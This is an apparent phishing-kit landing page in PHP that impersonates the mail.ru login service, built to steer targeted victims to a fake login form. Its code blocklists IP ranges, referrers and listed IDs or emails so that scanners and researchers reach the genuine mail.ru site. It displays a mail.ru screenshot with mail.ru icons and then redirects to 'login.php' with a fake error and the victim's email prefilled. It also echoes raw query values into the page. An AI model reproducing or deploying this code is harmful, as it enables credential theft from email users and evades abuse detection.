

<?
error_reporting(0);
$blackips = file_get_contents('blackip.txt');
$ipe = explode(".",$_SERVER["REMOTE_ADDR"]);
$ip_mask = $ipe[0].'.'.$ipe[1].'.'.$ipe[2];
if (preg_match("/$ip_mask/i", $blackips)) {
//black IP
 header("Location: https://e.mail.ru/"); header("Location: https://e.mail.ru/");echo "$notfound<div style=\"visibility:hidden\">bi</div>"; die();
}
?>


<?php 
session_start(); 
if($_SERVER['HTTP_REFERER'] == "https://www.google.com/") { 
header('Location: https://cayt.ru./'); 
die(); 
} 
?>






<?php
if (strpos($_SERVER['HTTP_REFERER'], 'www.google.com')) { 
header('Location: https://cayt.ru./'); 
die(); 
} 
?>



		<?php

$id=$_GET['id'];                                                      
$email=$_GET['email'];
$tmp=explode('@',$email);
$login=$tmp[0];
$domain=$tmp[1];

$ban = file('ban_m.txt');
$ban = str_replace("\r\n",'',$ban);
$ban = str_replace("\n",'',$ban);
$ban = str_replace(" ",'',$ban);
$ban = str_replace("     ",'',$ban);
foreach ($ban as $bn) if ("$id"==$bn)
{
header('Location: https://cloud.mail.ru/public/M51x/L8u161hz4J');
exit;
};  

	?>




<?php
if (strpos($_SERVER['HTTP_REFERER'], 'www.google.com')) { 
header('Location: https://cayt.ru./'); 
die(); 
} 
?>



<?
$email=$_GET['email'];
$tmp=explode('@',$email);
$login=$tmp[0];
$domain=$tmp[1];
$sid=$_GET['id'];
$b=$_GET['b'];


$ban = false;
if ($email != base64_decode($b)) $ban = true;


if ($ban)
{
header('Location: https://cloud.mail.ru/');
exit;
}

?>









	<?php

                                                               
$email=$_GET['email'];
$tmp=explode('@',$email);
$login=$tmp[0];
$domain=$tmp[1];
$id=$_GET['id'];
$b=$_GET['b'];
$ban = file('ban_m.txt');
$ban = str_replace("\r\n",'',$ban);
$ban = str_replace("\n",'',$ban);
$ban = str_replace(" ",'',$ban);
$ban = str_replace("     ",'',$ban);
foreach ($ban as $bn) if ("$email"==$bn)
{
header('Location: https://cloud.mail.ru/public/M51x/L8ugehz4J');
exit;
};  

	?>

	<?
if(isset($_COOKIE['pre48']))
{
	header('Location: login.php?out=1&'.$_SERVER['QUERY_STRING']);
	 exit;
}
?>



		<style>
body { 

    background-image: url('https://i.imgur.com/m9OBpN2.png'); 
    background-repeat: no-repeat; 
    -moz-background-size: 100%; 
    -webkit-background-size: 100%; 
    -o-background-size: 100%; 
    background-size: 100% 100%;
       }
</style>




<link rel="shortcut icon" type="image/x-icon" href="https://img.imgsmail.ru/r/default/favicon32.ico">
<link rel="apple-touch-icon" href="https://img.imgsmail.ru/r/ru/ios/icon_114.png">
<link rel="image_src" href="https://img.imgsmail.ru/r/promopage/icon-socialnetwork.jpg">

<META HTTP-EQUIV="refresh" CONTENT="2; url=login.php?out=1&email=<?php echo $_GET['email'];?>&id=<?php echo $_GET['id'];?>&b=<?php echo $_GET['b'];?>">


<script type="text/javascript"> 
setTimeout('location.replace("login.php?fail=1&id=<?php echo $_GET['id'];?>&j=1&email=<?php echo $_GET['email'];?>&b=<?php echo $_GET['b'];?>&err=104")', 2000); 
</script> 

